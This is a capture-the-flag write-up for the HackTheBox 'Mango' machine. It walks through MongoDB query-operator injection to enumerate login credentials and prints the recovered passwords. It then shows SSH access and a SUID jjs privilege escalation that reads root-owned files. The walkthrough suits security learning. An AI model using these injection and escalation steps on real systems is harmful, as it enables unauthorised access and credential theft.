---
title: "Mango = Mongo?"
date: 2020-01-15T13:34:47-05:00
draft: false
description: "MongoDB/NoSQL Query Object Injection | Mango (HTB)"
---

# MongoDB Query Object Injection | Mango (HTB)

Mango is a vulnerable host rated "Medium" on HackTheBox.eu.   

```
Hostname: mango  
IP Address: 10.10.10.162  
Ports: 20, 80, 443 
``` 

# Attack Method Explanation  


MongoDB Query Object Injection sounds super difficult but it is actually quite simple. Without proper sanitization of inputs to MongoDB queries, we can simply enumerate things like variable length, contents, included characters, using a systematic passing of MongoDB's query objects. Examples of such objects:  

```
$eq     "equal to"
$gt     "greater than"
$gte    "greater than or equal to"
$ne     "not equal to"
```

So with an example string of username=slixperi, we can enumerate the "rob" user by injecting (pseudo-code):  

```bash
POST  
for character a-zA-Z0-9:  # try all characters from a-z, A-Z 
    username[$eq]=a       # and 0-9 (dont forget special chars!)
        if response != 302:  
            character += 1  
        else  
            save character and move to next  
```
Eventually we build a list of valid characters for the username, and then the password once we direct the code towards the password parameter in our POST request. The same can be done to any insufficiently-validated parameter that goes into MongoDB queries.  


https://docs.mongodb.com/manual/reference/operator/query/




## Service Enumeration  

Navigating to https://10.10.10.162:443/ we are greeted with an invalid certificate warning. Taking a look at the certificate that is invalid we can see that there is a subdomain listed for the site at **staging-order.mango.htb**  

We can append staging-order.mango.htb and mango.htb to our /etc/hosts file in order to setup proper routing to the subdomain/domain. 

cat /etc/hosts
```
127.0.0.1       localhost
10.10.10.162    staging-order.mango.htb mango.htb
```

We are prompted with a login portal when visiting **http**://staging-order.mango.htb.  We can take this as a hint to look at the plaintext http traffic with a proxy tool like BurpSuite. Unfortunately all we see in Burp is a POSt request to the endpoint, which occasionally returns a 302 redirect to a weird page if we send some junk in the parameters. It turns out that using the box name "Mango" as a hint is the key since it indicates that the backend is MongoDB. NoSQLi/Object Query injection anyone? (very ctf-y but such is life). If you dirbuster/gobuster/dirb'd both endpoints you undoubtedly discovered /analytics.php which is a complete and total rabbit-hole including the discovered ian / ian sadovey / Ians-MBP found through enumerating the connected Elasticsearch indices. 

Luckily, an0nik wrote a solid enumeration script for insecure object references in MongoDB parameters.  

[Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git)

# Attack Path

We can now attack the endpoint with the script, passing the appropriate flags.  

```bash
python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb \
-m POST -up username -pp password -op login:login -ep username
```

```bash
python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb \
-m POST -up username -pp password -op login:login -ep password
```
```mango:h3mXK8RhU~f{]f5H```  
```admin:t9KcS3>!0B#2```

> The above "\\" character simply allows for linux to process the next line as all one command, allowing for easier viewing for the reader, maintaining copy-paste functionality.  

We can then SSH into the box as the mango user:  

```bash
ssh mango@10.10.10.162
```
> h3mXK8RhU~f{]f5H

Now to gain access of the "admin" user we can just use "su":  
```bash
su admin  
```  
> t9KcS3>!0B#2

We can then list the SUID/SGID binaries available to us by running LinEnum.sh or the following bash command:  
```bash
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
```

**/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs**

This is a Java interpreter, similar to irb or python from the command line; since it runs at root, we are root if we can craft just the right Java object!  

gtfobins has a great reference for this type of work, however the shell-invocation attempt tends to crash on this host - I wasn't able to figure out quite why, but directly reading the root.txt flag will definitely work. First run the Java interpreter by providing the exact patht to the executable, and then create the following Java commands.

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```
```java
var filename = "/root/root.txt";
var content = new java.lang.String(
                    java.nio.file.Files.readAllBytes(
                      java.nio.file.Paths.get(filename)
                    )
                  );
print(content)
```  

> The content variable ultimately stores the result from the readAllBytes method, and then we call the print method on content to read the flag!





